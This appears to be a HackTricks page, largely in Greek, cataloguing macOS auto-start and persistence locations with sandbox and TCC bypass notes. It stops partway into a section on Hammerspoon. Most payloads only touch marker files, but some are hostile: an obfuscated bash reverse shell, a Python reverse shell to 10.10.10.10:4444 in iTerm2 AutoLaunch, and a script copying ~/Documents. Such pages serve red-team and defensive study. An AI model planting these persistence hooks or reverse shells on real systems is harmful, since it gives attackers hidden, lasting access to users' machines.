# macOS Auto Start

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Αυτή η ενότητα βασίζεται σε μεγάλο βαθμό στη σειρά blog [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), ο στόχος είναι να προσθέσουμε **περισσότερες τοποθεσίες αυτόματης εκκίνησης** (αν είναι δυνατόν), να υποδείξουμε **ποιες τεχνικές λειτουργούν ακόμα** σήμερα με την τελευταία έκδοση του macOS (13.4) και να προσδιορίσουμε τις **άδειες** που απαιτούνται.

## Sandbox Bypass

{% hint style="success" %}
Εδώ μπορείτε να βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass** που σας επιτρέπουν να εκτελέσετε κάτι απλά **γράφοντας το σε ένα αρχείο** και **περιμένοντας** για μια πολύ **συνηθισμένη** **ενέργεια**, μια καθορισμένη **ποσότητα χρόνου** ή μια **ενέργεια που μπορείτε συνήθως να εκτελέσετε** από μέσα σε ένα sandbox χωρίς να χρειάζεστε δικαιώματα root.
{% endhint %}

### Launchd

* Χρήσιμο για την παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

* **`/Library/LaunchAgents`**
* **Trigger**: Επανεκκίνηση
* Απαιτείται root
* **`/Library/LaunchDaemons`**
* **Trigger**: Επανεκκίνηση
* Απαιτείται root
* **`/System/Library/LaunchAgents`**
* **Trigger**: Επανεκκίνηση
* Απαιτείται root
* **`/System/Library/LaunchDaemons`**
* **Trigger**: Επανεκκίνηση
* Απαιτείται root
* **`~/Library/LaunchAgents`**
* **Trigger**: Επανασύνδεση
* **`~/Library/LaunchDemons`**
* **Trigger**: Επανασύνδεση

{% hint style="success" %}
Ως ενδιαφέρον γεγονός, **`launchd`** έχει μια ενσωματωμένη λίστα ιδιοτήτων στην ενότητα Mach-o `__Text.__config` που περιέχει άλλες γνωστές υπηρεσίες που πρέπει να εκκινήσει το launchd. Επιπλέον, αυτές οι υπηρεσίες μπορεί να περιέχουν το `RequireSuccess`, `RequireRun` και `RebootOnSuccess` που σημαίνει ότι πρέπει να εκτελούνται και να ολοκληρώνονται με επιτυχία.

Φυσικά, δεν μπορεί να τροποποιηθεί λόγω υπογραφής κώδικα.
{% endhint %}

#### Περιγραφή & Εκμετάλλευση

**`launchd`** είναι η **πρώτη** **διαδικασία** που εκτελείται από τον πυρήνα του OX S κατά την εκκίνηση και η τελευταία που ολοκληρώνεται κατά την απενεργοποίηση. Πρέπει πάντα να έχει το **PID 1**. Αυτή η διαδικασία θα **διαβάσει και θα εκτελέσει** τις ρυθμίσεις που υποδεικνύονται στα **ASEP** **plists** σε:

* `/Library/LaunchAgents`: Πράκτορες ανά χρήστη που εγκαθίστανται από τον διαχειριστή
* `/Library/LaunchDaemons`: Daemons συστήματος που εγκαθίστανται από τον διαχειριστή
* `/System/Library/LaunchAgents`: Πράκτορες ανά χρήστη που παρέχονται από την Apple.
* `/System/Library/LaunchDaemons`: Daemons συστήματος που παρέχονται από την Apple.

Όταν ένας χρήστης συνδέεται, οι plists που βρίσκονται σε `/Users/$USER/Library/LaunchAgents` και `/Users/$USER/Library/LaunchDemons` εκκινούνται με τις **άδειες των συνδεδεμένων χρηστών**.

Η **κύρια διαφορά μεταξύ πρακτόρων και daemons είναι ότι οι πράκτορες φορτώνονται όταν ο χρήστης συνδέεται και οι daemons φορτώνονται κατά την εκκίνηση του συστήματος** (καθώς υπάρχουν υπηρεσίες όπως το ssh που πρέπει να εκτελούνται πριν οποιοσδήποτε χρήστης αποκτήσει πρόσβαση στο σύστημα). Επίσης, οι πράκτορες μπορεί να χρησιμοποιούν GUI ενώ οι daemons πρέπει να εκτελούνται στο παρασκήνιο.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Υπάρχουν περιπτώσεις όπου ένας **agent πρέπει να εκτελείται πριν ο χρήστης συνδεθεί**, αυτές ονομάζονται **PreLoginAgents**. Για παράδειγμα, αυτό είναι χρήσιμο για την παροχή υποστηρικτικής τεχνολογίας κατά την είσοδο. Μπορούν επίσης να βρεθούν στο `/Library/LaunchAgents` (δείτε [**εδώ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ένα παράδειγμα).

{% hint style="info" %}
Νέα αρχεία ρυθμίσεων Daemons ή Agents θα **φορτωθούν μετά την επόμενη επανεκκίνηση ή χρησιμοποιώντας** `launchctl load <target.plist>` Είναι **επίσης δυνατό να φορτωθούν αρχεία .plist χωρίς αυτή την επέκταση** με `launchctl -F <file>` (ωστόσο αυτά τα αρχεία plist δεν θα φορτωθούν αυτόματα μετά την επανεκκίνηση).\
Είναι επίσης δυνατό να **ξεφορτωθούν** με `launchctl unload <target.plist>` (η διαδικασία που υποδεικνύεται από αυτό θα τερματιστεί),

Για να **διασφαλίσετε** ότι δεν υπάρχει **τίποτα** (όπως μια υπέρβαση) που **να εμποδίζει** έναν **Agent** ή **Daemon** **να** **τρέξει**, εκτελέστε: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Λίστα με όλους τους agents και daemons που έχουν φορτωθεί από τον τρέχοντα χρήστη:
```bash
launchctl list
```
{% hint style="warning" %}
Αν ένα plist ανήκει σε έναν χρήστη, ακόμα και αν βρίσκεται σε φακέλους συστήματος daemon, η **εργασία θα εκτελείται ως ο χρήστης** και όχι ως root. Αυτό μπορεί να αποτρέψει κάποιες επιθέσεις ανύψωσης δικαιωμάτων.
{% endhint %}

#### Περισσότερες πληροφορίες σχετικά με το launchd

**`launchd`** είναι η **πρώτη** διαδικασία χρήστη που ξεκινά από τον **kernel**. Η εκκίνηση της διαδικασίας πρέπει να είναι **επιτυχής** και **δεν μπορεί να τερματιστεί ή να καταρρεύσει**. Είναι ακόμη **προστατευμένη** από ορισμένα **σήματα τερματισμού**.

Ένα από τα πρώτα πράγματα που θα κάνει το `launchd` είναι να **ξεκινήσει** όλους τους **daemons** όπως:

* **Daemons χρονοδιακόπτη** που εκτελούνται με βάση τον χρόνο:
* atd (`com.apple.atrun.plist`): Έχει ένα `StartInterval` 30 λεπτών
* crond (`com.apple.systemstats.daily.plist`): Έχει `StartCalendarInterval` για να ξεκινά στις 00:15
* **Δίκτυα daemons** όπως:
* `org.cups.cups-lpd`: Ακούει σε TCP (`SockType: stream`) με `SockServiceName: printer`
* SockServiceName πρέπει να είναι είτε μια θύρα είτε μια υπηρεσία από το `/etc/services`
* `com.apple.xscertd.plist`: Ακούει σε TCP στην θύρα 1640
* **Path daemons** που εκτελούνται όταν αλλάζει μια καθορισμένη διαδρομή:
* `com.apple.postfix.master`: Ελέγχει τη διαδρομή `/etc/postfix/aliases`
* **Daemons ειδοποιήσεων IOKit**:
* `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
* **Mach port:**
* `com.apple.xscertd-helper.plist`: Υποδεικνύει στην καταχώρηση `MachServices` το όνομα `com.apple.xscertd.helper`
* **UserEventAgent:**
* Αυτό είναι διαφορετικό από το προηγούμενο. Κάνει το launchd να δημιουργεί εφαρμογές σε απάντηση σε συγκεκριμένα γεγονότα. Ωστόσο, σε αυτή την περίπτωση, το κύριο δυαδικό που εμπλέκεται δεν είναι το `launchd` αλλά το `/usr/libexec/UserEventAgent`. Φορτώνει πρόσθετα από τον περιορισμένο φάκελο SIP /System/Library/UserEventPlugins/ όπου κάθε πρόσθετο υποδεικνύει τον αρχικοποιητή του στο κλειδί `XPCEventModuleInitializer` ή, στην περίπτωση παλαιότερων πρόσθετων, στο λεξικό `CFPluginFactories` κάτω από το κλειδί `FB86416D-6164-2070-726F-70735C216EC0` του `Info.plist` του.

### αρχεία εκκίνησης shell

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Αλλά χρειάζεστε να βρείτε μια εφαρμογή με μια παράκαμψη TCC που εκτελεί ένα shell που φορτώνει αυτά τα αρχεία

#### Τοποθεσίες

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Trigger**: Άνοιγμα ενός τερματικού με zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Trigger**: Άνοιγμα ενός τερματικού με zsh
* Απαιτείται root
* **`~/.zlogout`**
* **Trigger**: Έξοδος από ένα τερματικό με zsh
* **`/etc/zlogout`**
* **Trigger**: Έξοδος από ένα τερματικό με zsh
* Απαιτείται root
* Πιθανώς περισσότερα στο: **`man zsh`**
* **`~/.bashrc`**
* **Trigger**: Άνοιγμα ενός τερματικού με bash
* `/etc/profile` (δεν λειτούργησε)
* `~/.profile` (δεν λειτούργησε)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Trigger**: Αναμένονται να ενεργοποιηθούν με xterm, αλλά **δεν είναι εγκατεστημένο** και ακόμη και μετά την εγκατάσταση, εμφανίζεται αυτό το σφάλμα: xterm: `DISPLAY is not set`

#### Περιγραφή & Εκμετάλλευση

Όταν ξεκινάτε ένα περιβάλλον shell όπως το `zsh` ή το `bash`, **ορισμένα αρχεία εκκίνησης εκτελούνται**. Το macOS χρησιμοποιεί αυτή τη στιγμή το `/bin/zsh` ως προεπιλεγμένο shell. Αυτό το shell προσπελάζεται αυτόματα όταν εκκινείται η εφαρμογή Terminal ή όταν αποκτάται πρόσβαση σε μια συσκευή μέσω SSH. Ενώ το `bash` και το `sh` είναι επίσης παρόντα στο macOS, χρειάζεται να κληθούν ρητά για να χρησιμοποιηθούν.

Η σελίδα man του zsh, την οποία μπορούμε να διαβάσουμε με **`man zsh`**, έχει μια εκτενή περιγραφή των αρχείων εκκίνησης.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Επαναλειτουργία Εφαρμογών

{% hint style="danger" %}
Η ρύθμιση της υποδεικνυόμενης εκμετάλλευσης και η αποσύνδεση και σύνδεση ή ακόμα και η επανεκκίνηση δεν λειτούργησε για μένα για να εκτελέσω την εφαρμογή. (Η εφαρμογή δεν εκτελούνταν, ίσως χρειάζεται να είναι σε λειτουργία όταν εκτελούνται αυτές οι ενέργειες)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Trigger**: Επανεκκίνηση επαναλειτουργίας εφαρμογών

#### Περιγραφή & Εκμετάλλευση

Όλες οι εφαρμογές που θα επαναλειτουργήσουν βρίσκονται μέσα στο plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Έτσι, για να κάνετε τις επαναλειτουργούσες εφαρμογές να εκτελούν τη δική σας, απλώς χρειάζεται να **προσθέσετε την εφαρμογή σας στη λίστα**.

Το UUID μπορεί να βρεθεί καταγράφοντας αυτή τη διεύθυνση ή με `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Για να ελέγξετε τις εφαρμογές που θα επαναλειτουργήσουν μπορείτε να κάνετε:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Για να **προσθέσετε μια εφαρμογή σε αυτή τη λίστα** μπορείτε να χρησιμοποιήσετε:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

* Χρήσιμο για να παρακάμψει το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Η χρήση του Terminal απαιτεί άδειες FDA από τον χρήστη που το χρησιμοποιεί

#### Location

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Trigger**: Άνοιγμα του Terminal

#### Description & Exploitation

Στο **`~/Library/Preferences`** αποθηκεύονται οι προτιμήσεις του χρήστη στις Εφαρμογές. Ορισμένες από αυτές τις προτιμήσεις μπορεί να περιέχουν μια ρύθμιση για **εκτέλεση άλλων εφαρμογών/σκριπτών**.

Για παράδειγμα, το Terminal μπορεί να εκτελέσει μια εντολή κατά την εκκίνηση:

<figure><img src="../.gitbook/assets/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Αυτή η ρύθμιση αντικατοπτρίζεται στο αρχείο **`~/Library/Preferences/com.apple.Terminal.plist`** όπως αυτό:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Έτσι, αν το plist των προτιμήσεων του τερματικού στο σύστημα μπορούσε να αντικατασταθεί, τότε η **`open`** λειτουργία μπορεί να χρησιμοποιηθεί για να **ανοίξει το τερματικό και αυτή η εντολή θα εκτελείται**.

Μπορείτε να το προσθέσετε αυτό από το cli με:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminal Scripts / Άλλες επεκτάσεις αρχείων

* Χρήσιμο για να παρακάμψει το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Χρήση Terminal για να έχει άδειες FDA ο χρήστης που το χρησιμοποιεί

#### Τοποθεσία

* **Οπουδήποτε**
* **Ενεργοποίηση**: Άνοιγμα Terminal

#### Περιγραφή & Εκμετάλλευση

Αν δημιουργήσεις ένα [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) και το ανοίξεις, η **εφαρμογή Terminal** θα ενεργοποιηθεί αυτόματα για να εκτελέσει τις εντολές που αναφέρονται εκεί. Αν η εφαρμογή Terminal έχει κάποιες ειδικές άδειες (όπως TCC), η εντολή σου θα εκτελείται με αυτές τις ειδικές άδειες.

Δοκίμασέ το με:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
You could also use the extensions **`.command`**, **`.tool`**, with regular shell scripts content and they will be also opened by Terminal.

{% hint style="danger" %}
Αν το terminal έχει **Πλήρη Πρόσβαση Δίσκου**, θα μπορεί να ολοκληρώσει αυτή την ενέργεια (σημειώστε ότι η εντολή που εκτελείται θα είναι ορατή σε ένα παράθυρο terminal).
{% endhint %}

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Χρήσιμο για να παρακάμψετε το sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
* Μπορεί να αποκτήσετε κάποια επιπλέον πρόσβαση TCC

#### Location

* **`/Library/Audio/Plug-Ins/HAL`**
* Απαιτείται root
* **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
* **`/Library/Audio/Plug-ins/Components`**
* Απαιτείται root
* **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
* **`~/Library/Audio/Plug-ins/Components`**
* **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή
* **`/System/Library/Components`**
* Απαιτείται root
* **Trigger**: Επανεκκίνηση του coreaudiod ή του υπολογιστή

#### Description

Σύμφωνα με τις προηγούμενες αναφορές, είναι δυνατό να **συγκεντρωθούν κάποια audio plugins** και να φορτωθούν.

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Χρήσιμο για να παρακάμψετε το sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
* Μπορεί να αποκτήσετε κάποια επιπλέον πρόσβαση TCC

#### Location

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

Τα QuickLook plugins μπορούν να εκτελούνται όταν **προκαλείτε την προεπισκόπηση ενός αρχείου** (πατήστε το πλήκτρο διαστήματος με το αρχείο επιλεγμένο στο Finder) και ένα **plugin που υποστηρίζει αυτόν τον τύπο αρχείου** είναι εγκατεστημένο.

Είναι δυνατό να συγκεντρώσετε το δικό σας QuickLook plugin, να το τοποθετήσετε σε μία από τις προηγούμενες τοποθεσίες για να το φορτώσετε και στη συνέχεια να πάτε σε ένα υποστηριζόμενο αρχείο και να πατήσετε το πλήκτρο διαστήματος για να το προκαλέσετε.

### ~~Login/Logout Hooks~~

{% hint style="danger" %}
Αυτό δεν λειτούργησε για μένα, ούτε με το LoginHook του χρήστη ούτε με το LogoutHook του root
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Χρήσιμο για να παρακάμψετε το sandbox: [✅](https://emojipedia.org/check-mark-button)
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* Πρέπει να μπορείτε να εκτελέσετε κάτι σαν `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Είναι απαρχαιωμένα αλλά μπορούν να χρησιμοποιηθούν για να εκτελούν εντολές όταν συνδέεται ένας χρήστης.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Αυτή η ρύθμιση αποθηκεύεται στο `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Για να το διαγράψετε:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
The root user one is stored in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

{% hint style="success" %}
Εδώ μπορείτε να βρείτε τοποθεσίες εκκίνησης χρήσιμες για **sandbox bypass** που σας επιτρέπει να εκτελέσετε κάτι απλά **γράφοντας το σε ένα αρχείο** και **περιμένοντας όχι πολύ κοινές συνθήκες** όπως συγκεκριμένα **προγράμματα εγκατεστημένα, "ασυνήθιστες" ενέργειες χρηστών** ή περιβάλλοντα.
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Χρήσιμο για να παρακάμψετε το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ωστόσο, πρέπει να μπορείτε να εκτελέσετε το δυαδικό `crontab`
* Ή να είστε root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Απαιτείται root για άμεση πρόσβαση εγγραφής. Δεν απαιτείται root αν μπορείτε να εκτελέσετε `crontab <file>`
* **Trigger**: Εξαρτάται από τη δουλειά cron

#### Description & Exploitation

Λίστα με τις δουλειές cron του **τρέχοντος χρήστη** με:
```bash
crontab -l
```
Μπορείτε επίσης να δείτε όλα τα cron jobs των χρηστών στο **`/usr/lib/cron/tabs/`** και **`/var/at/tabs/`** (χρειάζεται root).

Στο MacOS, αρκετοί φάκελοι που εκτελούν scripts με **ορισμένη συχνότητα** μπορούν να βρεθούν σε:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Εκεί μπορείτε να βρείτε τις κανονικές **cron** **εργασίες**, τις **at** **εργασίες** (όχι πολύ χρησιμοποιούμενες) και τις **περιοδικές** **εργασίες** (κυρίως χρησιμοποιούνται για τον καθαρισμό προσωρινών αρχείων). Οι καθημερινές περιοδικές εργασίες μπορούν να εκτελούνται για παράδειγμα με: `periodic daily`.

Για να προσθέσετε μια **εργασία cron χρήστη προγραμματισμένα** είναι δυνατόν να χρησιμοποιήσετε:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Το iTerm2 είχε παραχωρηθεί άδειες TCC

#### Τοποθεσίες

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Trigger**: Άνοιγμα του iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Trigger**: Άνοιγμα του iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Trigger**: Άνοιγμα του iTerm

#### Περιγραφή & Εκμετάλλευση

Τα σενάρια που αποθηκεύονται στο **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** θα εκτελούνται. Για παράδειγμα:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ή:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Το σενάριο **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** θα εκτελείται επίσης:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Οι ρυθμίσεις του iTerm2 που βρίσκονται στο **`~/Library/Preferences/com.googlecode.iterm2.plist`** μπορούν **να υποδείξουν μια εντολή προς εκτέλεση** όταν ανοίγει το τερματικό iTerm2.

Αυτή η ρύθμιση μπορεί να διαμορφωθεί στις ρυθμίσεις του iTerm2:

<figure><img src="../.gitbook/assets/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Και η εντολή αντικατοπτρίζεται στις ρυθμίσεις:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Μπορείτε να ορίσετε την εντολή που θα εκτελείται με: 

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Υπάρχει μεγάλη πιθανότητα να υπάρχουν **άλλοι τρόποι κατάχρησης των ρυθμίσεων του iTerm2** για την εκτέλεση αυθαίρετων εντολών.
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το xbar πρέπει να είναι εγκατεστημένο
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Ζητά άδειες προσβασιμότητας

#### Τοποθεσία

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Trigger**: Μόλις εκτελεστεί το xbar

#### Περιγραφή

Εάν είναι εγκατεστημένο το δημοφιλές πρόγραμμα [**xbar**](https://github.com/matryer/xbar), είναι δυνατόν να γραφτεί ένα shell script στο **`~/Library/Application\ Support/xbar/plugins/`** το οποίο θα εκτελείται όταν ξεκινά το xbar:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Χρήσιμο για να παρακαμφθεί το sandbox: [✅](https://emojipedia.org/check-mark-button)
* Αλλά το Hammerspoon πρέπει να είναι εγκατεστημένο
* Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
* Ζητά άδειες προσβασιμότητας

#### Location

* **`~/.hammerspoon/init.lua`**
* **Trigger**: Μόλις εκτελεστεί το hammerspoon

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) λειτουργεί ως πλατφόρμα αυτοματοποίησης για **macOS**, αξιοποιώντας τη **γλώσσα προγραμματισμού LUA** για τις λειτουργίες του. Σημαντικά, υποστηρίζει την ενσωμάτωση πλήρους κώδικα AppleScript και την εκτέλεση shell scripts, ενισχύοντας σημαντικά τις δυνατότητες scripting του.

